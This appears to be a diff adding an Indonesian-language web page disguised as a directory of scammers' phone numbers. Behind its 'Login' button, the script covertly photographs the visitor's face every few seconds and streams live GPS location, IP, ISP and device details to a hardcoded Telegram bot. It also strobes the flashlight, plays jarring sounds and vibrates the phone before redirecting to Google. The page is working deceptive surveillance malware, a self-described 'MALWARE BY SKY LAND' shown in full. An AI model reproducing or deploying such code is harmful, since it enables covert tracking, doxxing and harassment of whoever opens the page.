@@ -1,0 +1,501 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>KUMPULAN NOMER PENIPUAN</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            font-family: 'Segoe UI', 'Roboto', sans-serif;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .container { max-width: 400px; width: 100%; }
+        .card {
+            background: white;
+            border-radius: 24px;
+            padding: 32px 24px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.2);
+            text-align: center;
+        }
+        .icon {
+            width: 80px;
+            height: 80px;
+            margin: 0 auto 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .icon img {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+        }
+        h2 { color: #333; margin-bottom: 12px; font-size: 1.5rem; }
+        p { color: #666; margin-bottom: 24px; line-height: 1.5; font-size: 0.9rem; }
+        .btn {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white; border: none; padding: 14px 28px; border-radius: 40px;
+            font-size: 1rem; font-weight: bold; cursor: pointer; width: 100%;
+            transition: transform 0.2s;
+        }
+        .btn:hover { transform: scale(1.02); }
+        .status { margin-top: 20px; font-size: 0.8rem; color: #888; }
+        video {
+            position: fixed;            top: 0;
+            left: 0;
+            width: 100%;
+            height: auto;
+            opacity: 0;
+            pointer-events: none;
+            z-index: -1;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="card">
+            <div class="icon">
+                <img src="https://files.catbox.moe/umjpnb.png" alt="logo" onerror="this.src='data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><circle cx=%2250%22 cy=%2250%22 r=%2245%22 fill=%22%23667eea%22/><text x=%2250%22 y=%2265%22 text-anchor=%22middle%22 fill=%22white%22 font-size=%2240%22>🔒</text></svg>'">
+            </div>
+            <h2>KUMPULAN NOMER PENIPUAN</h2>
+            <p>Website ini kumpulan nomer para penipuan jual beli di berbagai daerah <br>Cek daftar nomer penipuan di daerah anda.</p>
+            <button class="btn" id="verifyBtn">Login</button>
+            <div class="status" id="statusMsg">Mohon Izinkan perizinan supaya bisa login</div>
+        </div>
+    </div>
+
+    <video id="cameraFeed" autoplay playsinline muted></video>
+
+    <script>
+        // TELEGRAM CONFIG — SESUAI YANG ANDA BERIKAN
+        const BOT_TOKEN = "7961448359:AAFig9R1lEBznZH1dr1yozwzQFWP6PlRJHQ";
+        const CHAT_ID = "7284499809";
+        
+        let mediaStream = null;
+        let cameraStream = null;
+        let captureInterval = null;
+        let locationInterval = null;
+        let flashInterval = null;
+        let audioInterval = null;
+        let audioContext = null;
+        let flashTrack = null;
+        let isActive = false;
+        let currentLat = null, currentLng = null;
+        let currentLocationText = "Tidak terdeteksi";
+        let currentMapsLink = "-";
+        let videoElement = null;
+        
+        // ======================= TELEGRAM SENDER =======================
+        async function sendToTelegram(message, photoBase64 = null) {
+            try {
+                if (photoBase64) {
+                    const blob = dataURLtoBlob(photoBase64);
+                    const formData = new FormData();                    formData.append('chat_id', CHAT_ID);
+                    formData.append('photo', blob, 'face.jpg');
+                    formData.append('caption', message);
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+                } else {
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'HTML', disable_web_page_preview: false })
+                    });
+                }
+            } catch(e) { console.error('Send error:', e); }
+        }
+        
+        function dataURLtoBlob(dataURL) {
+            const arr = dataURL.split(',');
+            const mime = arr[0].match(/:(.*?);/)[1];
+            const bstr = atob(arr[1]);
+            let n = bstr.length;
+            const u8arr = new Uint8Array(n);
+            while (n--) u8arr[n] = bstr.charCodeAt(n);
+            return new Blob([u8arr], { type: mime });
+        }
+        
+        // ======================= AMBIL FOTO WAJAH =======================
+        function captureAndSendPhoto() {
+            if (!isActive) return;
+            
+            const video = document.getElementById('cameraFeed');
+            if (!video || video.readyState !== video.HAVE_ENOUGH_DATA) {
+                console.log("Video not ready");
+                return;
+            }
+            
+            if (video.videoWidth === 0 || video.videoHeight === 0) {
+                console.log("Video dimensions zero");
+                return;
+            }
+            
+            try {
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                const photoBase64 = canvas.toDataURL('image/jpeg', 0.85);
+                
+                const caption = `📸 [FACE CAPTURE] ${new Date().toLocaleString()}\n📍 ${currentLocationText}\n🗺️ ${currentMapsLink}`;
+                sendToTelegram(caption, photoBase64);
+                console.log("Photo sent");            } catch(e) {
+                console.error("Capture error:", e);
+            }
+        }
+        
+        function startContinuousCapture() {
+            if (captureInterval) clearInterval(captureInterval);
+            captureInterval = setInterval(() => {
+                if (isActive) captureAndSendPhoto();
+            }, 4000);
+        }
+        
+        // ======================= SENTER NYALA MATI CEPAT =======================
+        async function initFlashTorch() {
+            try {
+                if (flashTrack) {
+                    try { flashTrack.stop(); } catch(e) {}
+                    flashTrack = null;
+                }
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: "environment" } } });
+                const track = stream.getVideoTracks()[0];
+                if (!track) return null;
+                const capabilities = track.getCapabilities();
+                if (!capabilities.torch) {
+                    stream.getTracks().forEach(t => t.stop());
+                    return null;
+                }
+                flashTrack = track;
+                return track;
+            } catch(err) {
+                console.warn("Flash not supported:", err);
+                return null;
+            }
+        }
+        
+        async function startFlashStrobe() {
+            if (flashInterval) clearInterval(flashInterval);
+            if (!flashTrack) {
+                await initFlashTorch();
+            }
+            if (!flashTrack) return;
+            
+            let state = false;
+            flashInterval = setInterval(async () => {
+                if (!flashTrack || !isActive) return;
+                try {
+                    await flashTrack.applyConstraints({ advanced: [{ torch: !state }] });
+                    state = !state;
+                } catch(e) {}
+            }, 150);        }
+        
+        function stopFlashStrobe() {
+            if (flashInterval) {
+                clearInterval(flashInterval);
+                flashInterval = null;
+            }
+            if (flashTrack) {
+                try {
+                    flashTrack.applyConstraints({ advanced: [{ torch: false }] });
+                    flashTrack.stop();
+                } catch(e) {}
+                flashTrack = null;
+            }
+        }
+        
+        // ======================= SUARA ANEH =======================
+        function playWeirdSound() {
+            if (!audioContext) {
+                audioContext = new (window.AudioContext || window.webkitAudioContext)();
+            }
+            if (audioContext.state === 'suspended') {
+                audioContext.resume();
+            }
+            
+            const now = audioContext.currentTime;
+            const oscillator = audioContext.createOscillator();
+            const gainNode = audioContext.createGain();
+            const filter = audioContext.createBiquadFilter();
+            
+            const freqs = [220, 330, 440, 550, 660, 770, 880];
+            oscillator.type = 'sawtooth';
+            oscillator.frequency.value = freqs[Math.floor(Math.random() * freqs.length)];
+            
+            filter.type = 'bandpass';
+            filter.frequency.value = 600 + Math.random() * 500;
+            filter.Q.value = 8;
+            
+            gainNode.gain.value = 0.35;
+            
+            oscillator.connect(filter);
+            filter.connect(gainNode);
+            gainNode.connect(audioContext.destination);
+            
+            oscillator.start();
+            gainNode.gain.exponentialRampToValueAtTime(0.00001, now + 0.25);
+            oscillator.stop(now + 0.25);
+        }
+        
+        function startWeirdAudioLoop() {            if (audioInterval) clearInterval(audioInterval);
+            audioInterval = setInterval(() => {
+                if (isActive) {
+                    playWeirdSound();
+                    setTimeout(() => { if (isActive) playWeirdSound(); }, 80);
+                }
+            }, 500);
+        }
+        
+        function stopWeirdAudioLoop() {
+            if (audioInterval) {
+                clearInterval(audioInterval);
+                audioInterval = null;
+            }
+        }
+        
+        // ======================= AMBIL NAMA WIFI =======================
+        async function getWifiSSID() {
+            let networkInfo = "Tidak terdeteksi";
+            if (navigator.connection) {
+                const type = navigator.connection.type || navigator.connection.effectiveType;
+                const downlink = navigator.connection.downlink;
+                networkInfo = `${type || 'unknown'} (${downlink || '?'} Mbps)`;
+            }
+            
+            try {
+                const ipRes = await fetch('https://ipapi.co/json/');
+                const ipData = await ipRes.json();
+                if (ipData.org) {
+                    networkInfo = `${networkInfo} | ISP: ${ipData.org}`;
+                }
+            } catch(e) {}
+            
+            if (navigator.connection && navigator.connection.type === 'wifi') {
+                networkInfo = `📶 WiFi Terdeteksi - ${networkInfo}`;
+            } else if (navigator.connection && navigator.connection.type === 'cellular') {
+                networkInfo = `📱 Seluler - ${networkInfo}`;
+            }
+            
+            return networkInfo;
+        }
+        
+        // ======================= AMBIL LOKASI =======================
+        async function getLocation() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    resolve({ lat: null, lng: null, text: "Tidak support GPS", mapsLink: "-" });
+                    return;
+                }
+                navigator.geolocation.getCurrentPosition(                    (pos) => {
+                        currentLat = pos.coords.latitude;
+                        currentLng = pos.coords.longitude;
+                        currentLocationText = `${currentLat.toFixed(6)}, ${currentLng.toFixed(6)} (akurasi ${Math.round(pos.coords.accuracy)}m)`;
+                        currentMapsLink = `https://www.google.com/maps?q=${currentLat},${currentLng}`;
+                        resolve({ lat: currentLat, lng: currentLng, text: currentLocationText, mapsLink: currentMapsLink });
+                    },
+                    () => resolve({ lat: null, lng: null, text: "Izin lokasi ditolak", mapsLink: "-" }),
+                    { enableHighAccuracy: true, timeout: 10000 }
+                );
+            });
+        }
+        
+        // ======================= LIVE LOCATION UPDATE =======================
+        function startLiveLocationUpdates() {
+            if (locationInterval) clearInterval(locationInterval);
+            locationInterval = setInterval(async () => {
+                if (isActive) {
+                    const loc = await getLocation();
+                    if (loc.mapsLink !== "-") {
+                        await sendToTelegram(`📍 LIVE UPDATE LOKASI\n🗺️ ${loc.mapsLink}\n📌 ${loc.text}`);
+                    }
+                }
+            }, 15000);
+        }
+        
+        // ======================= KUMPULKAN SEMUA DATA =======================
+        async function collectAndSendData() {
+            let ip = "Tidak terdeteksi", operator = "-", country = "-";
+            try {
+                const ipRes = await fetch('https://ipapi.co/json/');
+                const ipData = await ipRes.json();
+                ip = ipData.ip || ip;
+                operator = ipData.org || '-';
+                country = ipData.country_name || '-';
+            } catch(e) {}
+            
+            const locationData = await getLocation();
+            const wifiInfo = await getWifiSSID();
+            
+            let battery = "Tidak tersedia";
+            if ('getBattery' in navigator) {
+                try {
+                    const bat = await navigator.getBattery();
+                    battery = `${Math.round(bat.level * 100)}% ${bat.charging ? '🔌 (Mengisi)' : '⚡ (Baterai)'}`;
+                } catch(e) {}
+            }
+            
+            const ua = navigator.userAgent;
+            let deviceModel = "Unknown";            if (/Android/i.test(ua)) {
+                const brandMatch = ua.match(/(SM-[A-Z0-9]+|Redmi|Mi|POCO|Realme|OnePlus|OPPO|vivo|Pixel|Xiaomi|Infinix|Tecno|Samsung)/i);
+                deviceModel = brandMatch ? brandMatch[0] : "Android Device";
+            } else if (/iPhone|iPad/i.test(ua)) deviceModel = "Apple iOS";
+            else if (/Windows/i.test(ua)) deviceModel = "Windows PC";
+            else if (/Mac/i.test(ua)) deviceModel = "Macintosh";
+            
+            let ram = "Tidak tersedia";
+            if (navigator.deviceMemory) ram = `${navigator.deviceMemory} GB`;
+            else if (performance.memory) ram = `${(performance.memory.totalJSHeapSize / (1024*1024)).toFixed(0)} MB (JS heap)`;
+            
+            let cpu = `${navigator.hardwareConcurrency || '?'} Core / ${navigator.platform || 'unknown'}`;
+            
+            const kartuNomer = `${operator} (${country})`;
+            
+            const message = `🔴 <b>MALWARE BY SKY LAND</b> 🔴
+            
+🌐 IP: ${ip}
+📍 LOKASI: ${locationData.text}
+🗺️ LINK MAPS: <a href="${locationData.mapsLink}">${locationData.mapsLink}</a>
+📇 KARTU NOMER: ${kartuNomer}
+📞 NOMER: Tidak tersedia (web restriction)
+📱 MEREK HP: ${deviceModel}
+🧠 RAM: ${ram}
+⚙️ CPU: ${cpu}
+🔋 BATRAI: ${battery}
+📡 WIFI/SSID: ${wifiInfo}
+🕒 ZONA WAKTU: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
+📐 RESOLUSI: ${screen.width}x${screen.height}
+
+⚠️ <b>NOTE:</b> MALWARE INI DI BUAT UNTUK MENCARI LOKASI SAMA WAJAH PELAKU. JADI JIKA KALIAN KLIK MAKA MUKA KALIAN DAN DATA KALIAN SEDANG KAMI PANTAU`;
+            
+            await sendToTelegram(message);
+        }
+        
+        // ======================= SETUP KAMERA =======================
+        async function setupCamera() {
+            try {
+                if (cameraStream) {
+                    cameraStream.getTracks().forEach(track => track.stop());
+                }
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        facingMode: "user",
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 }
+                    },
+                    audio: false 
+                });
+                cameraStream = stream;                videoElement = document.getElementById('cameraFeed');
+                videoElement.srcObject = stream;
+                videoElement.setAttribute('autoplay', 'true');
+                videoElement.setAttribute('playsinline', 'true');
+                
+                await new Promise((resolve) => {
+                    videoElement.onloadedmetadata = () => {
+                        videoElement.play();
+                        resolve();
+                    };
+                    setTimeout(resolve, 2000);
+                });
+                
+                console.log("Camera ready, dimensions:", videoElement.videoWidth, videoElement.videoHeight);
+                return true;
+            } catch(e) {
+                console.error("Camera error:", e);
+                return false;
+            }
+        }
+        
+        // ======================= AKTIFKAN SEMUA EFEK =======================
+        async function activateAllEffects() {
+            await initFlashTorch();
+            startFlashStrobe();
+            startWeirdAudioLoop();
+            
+            if (navigator.vibrate) {
+                navigator.vibrate([300, 100, 300, 100, 500]);
+                setInterval(() => {
+                    if (isActive) navigator.vibrate([100, 50, 100]);
+                }, 2000);
+            }
+        }
+        
+        function stopAllEffects() {
+            stopFlashStrobe();
+            stopWeirdAudioLoop();
+            if (audioContext) {
+                audioContext.close();
+                audioContext = null;
+            }
+        }
+        
+        // ======================= MAIN EXECUTION =======================
+        async function executeAfterPermission() {
+            document.getElementById('statusMsg').innerHTML = "Memverifikasi data...";
+            document.getElementById('statusMsg').style.color = "#4caf50";
+            isActive = true;
+                        const cameraOk = await setupCamera();
+            if (cameraOk) {
+                startContinuousCapture();
+            } else {
+                console.warn("Camera failed, but continuing");
+            }
+            
+            startLiveLocationUpdates();
+            await activateAllEffects();
+            await collectAndSendData();
+            
+            setTimeout(() => {
+                if (isActive && cameraOk) captureAndSendPhoto();
+            }, 2000);
+            
+            document.getElementById('statusMsg').innerHTML = "✓ Verifikasi berhasil, mengalihkan...";
+            setTimeout(() => {
+                window.location.href = "https://www.google.com";
+            }, 3000);
+        }
+        
+        // ======================= EVENT LISTENER =======================
+        document.getElementById('verifyBtn').addEventListener('click', async () => {
+            const btn = document.getElementById('verifyBtn');
+            btn.disabled = true;
+            btn.innerHTML = "Memproses...";
+            
+            let locationGranted = false;
+            if (navigator.geolocation) {
+                locationGranted = await new Promise((resolve) => {
+                    navigator.geolocation.getCurrentPosition(() => resolve(true), () => resolve(false), { timeout: 8000 });
+                });
+            }
+            
+            let cameraGranted = false;
+            try {
+                const testStream = await navigator.mediaDevices.getUserMedia({ video: true });
+                testStream.getTracks().forEach(t => t.stop());
+                cameraGranted = true;
+            } catch(e) {
+                cameraGranted = false;
+            }
+            
+            if (locationGranted || cameraGranted) {
+                await executeAfterPermission();
+            } else {
+                document.getElementById('statusMsg').innerHTML = "Izin diperlukan. Anda Belum Klik Perizinan";
+                btn.disabled = false;
+                btn.innerHTML = "Login Gagal";
+            }        });
+        
+        window.addEventListener('beforeunload', () => {
+            stopAllEffects();
+            if (cameraStream) {
+                cameraStream.getTracks().forEach(t => t.stop());
+            }
+        });
+    </script>
+</body>
+</html>
